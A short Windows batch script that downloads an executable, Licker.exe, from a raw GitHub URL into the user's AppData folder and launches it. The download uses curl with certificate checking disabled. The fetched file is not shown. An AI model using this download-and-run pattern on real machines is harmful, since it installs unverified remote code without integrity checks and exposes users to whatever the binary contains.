@echo off
title Lickers Deployment
echo [SYSTEM] Attempting secure download...

:: 1. Define paths with quotes to handle potential spaces in Windows usernames
set "TARGET_DIR=%LOCALAPPDATA%\Lickers"
set "TARGET_EXE=%TARGET_DIR%\Licker.exe"

:: 2. Create the directory if it doesn't exist
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: 3. The -k flag ignores the SSL revocation error you saw earlier
:: The -f flag makes curl fail visibly if the file is missing
echo [SYSTEM] Downloading components from GitHub...
curl -k -L -f -o "%TARGET_EXE%" "https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"

:: 4. Check the exit code of the curl command
if %errorlevel% neq 0 (
    echo.
    echo [ERROR] Download failed (Error Code: %errorlevel%). 
    echo This usually means the GitHub Action failed to sync the EXE.
    pause
    exit /b
)

:: 5. Launch the application
if exist "%TARGET_EXE%" (
    echo [SUCCESS] Launching Lickers Portal...
    start "" "%TARGET_EXE%"
    timeout /t 3 >nul
) else (
    echo [ERROR] File was not saved to disk. Check antivirus settings.
    pause
)
exit
